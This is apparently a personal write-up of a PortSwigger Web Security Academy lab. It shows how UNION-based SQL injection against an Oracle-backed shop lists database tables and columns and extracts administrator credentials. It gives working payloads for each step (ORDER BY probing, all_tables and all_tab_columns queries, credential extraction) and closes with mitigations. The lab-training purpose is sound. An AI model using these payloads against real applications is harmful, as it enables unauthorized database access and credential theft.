# SQL Injection Attack, Listing the Database Contents on Oracle

## Lab Information

| Category | SQL Injection |
|---|---|
| Lab Name | SQL injection attack, listing the database contents on Oracle |
| Difficulty | Practitioner |
| Platform | PortSwigger Web Security Academy |

---

# Description

This lab demonstrates a UNION-based SQL Injection vulnerability used to enumerate Oracle database contents and extract administrator credentials.

The application filtered products using the following endpoint:

```text
/filter?category=lifestyle
```

The attacker first identified the number of columns returned by the backend query using the `ORDER BY` technique.

After confirming that the query returned **2 columns**, Oracle system tables were queried to:
- enumerate database tables
- identify user-related tables
- retrieve column names
- extract usernames and passwords

The administrator credentials were then used to authenticate successfully.

---

# Vulnerability Type

- SQL Injection (SQLi)
- UNION-Based SQL Injection
- Database Enumeration
- Credential Extraction

---

# Impact

An attacker can enumerate backend database structures and extract sensitive information.

This may lead to:
- credential disclosure
- unauthorized administrator access
- sensitive data exposure
- privilege escalation
- complete database compromise

Database enumeration is one of the most dangerous stages of SQL Injection exploitation.

---

# Steps to Reproduce

1. Open the target application.
2. Navigate to the **Lifestyle** category.
3. Capture the following request using Burp Suite:

```text
/filter?category=lifestyle
```

4. Use the `ORDER BY` technique to determine the number of columns.

Example payload:

```sql
/filter?category=' ORDER BY 2--
```

5. Confirm that the backend query contains **2 columns**.
6. Retrieve table names using Oracle's `all_tables` system table:

```sql
/filter?category=' UNION SELECT table_name,null FROM all_tables--
```

7. Identify the users table:

```text
USERS_HNXMGL
```

8. Retrieve column names from the identified table:

```sql
/filter?category=' UNION SELECT column_name,null FROM all_tab_columns WHERE table_name='USERS_HNXMGL'--
```

9. Identify the username and password columns:

```text
USERNAME_CEJRVQ
PASSWORD_MRXCDL
```

10. Extract usernames and passwords using:

```sql
/filter?category=' UNION SELECT USERNAME_CEJRVQ,PASSWORD_MRXCDL FROM USERS_HNXMGL--
```

11. Retrieve the administrator credentials from the response.
12. Navigate to the login page.
13. Authenticate using the extracted administrator credentials.
14. The lab gets successfully solved.

---

# Proof of Concept (PoC)

## Step 1 — Accessing the Main Website

The application initially appears to be a normal e-commerce website with product filtering functionality.

![Main Website](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/sqli/SQL%20Injection%20Attack,%20Listing%20the%20Database%20Contents%20on%20Oracle/screenshots/lab8.png?raw=true)

**Caption:** Initial application interface containing the Lifestyle category filter.

---

## Step 2 — Capturing the Product Filter Request

The request generated after selecting the **Lifestyle** category was intercepted using Burp Suite.

```text
/filter?category=lifestyle
```

![Captured Request](screenshots/sqli-oracle-enum-2.png)

**Caption:** Captured request using the category filter parameter.

---

## Step 3 — Determining the Number of Columns

The `ORDER BY` technique was used to determine the number of columns returned by the backend query.

Example payload:

```sql
/filter?category=' ORDER BY 2--
```

The query confirmed that the application contained **2 columns**.

![ORDER BY Enumeration](screenshots/sqli-oracle-enum-3.png)

**Caption:** Using the `ORDER BY` technique to determine backend query columns.

---

## Step 4 — Enumerating Database Tables

The following payload was used to retrieve table names from Oracle's `all_tables` system table:

```sql
/filter?category=' UNION SELECT table_name,null FROM all_tables--
```

After executing the payload, a users table named:

```text
USERS_HNXMGL
```

was discovered.

![Table Enumeration](screenshots/sqli-oracle-enum-4.png)

**Caption:** Enumerating database tables using Oracle system tables.

---

## Step 5 — Retrieving Column Names

Using the discovered table name, the following payload was created:

```sql
/filter?category=' UNION SELECT column_name,null FROM all_tab_columns WHERE table_name='USERS_HNXMGL'--
```

This revealed the following columns:
- `USERNAME_CEJRVQ`
- `PASSWORD_MRXCDL`

![Column Enumeration](screenshots/sqli-oracle-enum-5.png)

**Caption:** Retrieving column names from the discovered users table.

---

## Step 6 — Extracting Administrator Credentials

After identifying the table and column names, the final payload was crafted:

```sql
/filter?category=' UNION SELECT USERNAME_CEJRVQ,PASSWORD_MRXCDL FROM USERS_HNXMGL--
```

The response displayed usernames and passwords, including the administrator credentials.

![Credential Extraction](screenshots/sqli-oracle-enum-6.png)

**Caption:** Extracting usernames and passwords from the users table.

---

## Step 7 — Logging into the Administrator Account

The extracted administrator credentials were used on the login page.

![Administrator Login](screenshots/sqli-oracle-enum-7.png)

**Caption:** Attempting administrator login using extracted credentials.

---

## Step 8 — Successful Administrator Access

The administrator login succeeded successfully.

The lab was solved successfully.

![Administrator Access](screenshots/sqli-oracle-enum-8.png)

**Caption:** Successful administrator login after extracting credentials via SQL Injection.

---

# Why It Works

The application directly inserted user-controlled input into SQL queries without proper sanitization.

The attacker used:
- `ORDER BY` queries to determine the number of columns
- Oracle system tables to enumerate database structures
- UNION-based SQL Injection to retrieve sensitive data

Oracle exposes metadata through:
- `all_tables`
- `all_tab_columns`

This allowed enumeration of:
- table names
- column names
- sensitive user credentials

The final payload successfully extracted administrator credentials from the backend database.

---

# Security Risk

This vulnerability can result in:
- database enumeration
- credential disclosure
- unauthorized administrator access
- privilege escalation
- complete database compromise

SQL Injection vulnerabilities capable of database enumeration are considered critical.

---

# Recommended Mitigation

- Use parameterized queries (prepared statements).
- Never concatenate user input into SQL queries.
- Apply strict input validation.
- Restrict database permissions using least privilege principles.
- Avoid exposing unnecessary database metadata.

---

# Learning Section

## What I Learned

- Oracle databases expose metadata through system tables such as `all_tables` and `all_tab_columns`.
- SQL Injection can enumerate backend database structures.
- UNION-based SQL Injection can extract sensitive credentials from database tables.
- `ORDER BY` queries help determine backend query structure.
- Database fingerprinting and enumeration are important phases of SQL Injection exploitation.

---

# Tools Used

- Burp Suite
- Burp Repeater
- Firefox Developer Tools
- PortSwigger Web Security Academy
- PortSwigger SQL Injection Cheat Sheet

---

# Conclusion

This lab demonstrated a UNION-based SQL Injection vulnerability that allowed enumeration of Oracle database contents and extraction of administrator credentials.

By querying Oracle system tables and crafting UNION-based SQL Injection payloads, sensitive database structures and credentials were successfully exposed, ultimately allowing unauthorized administrator access.
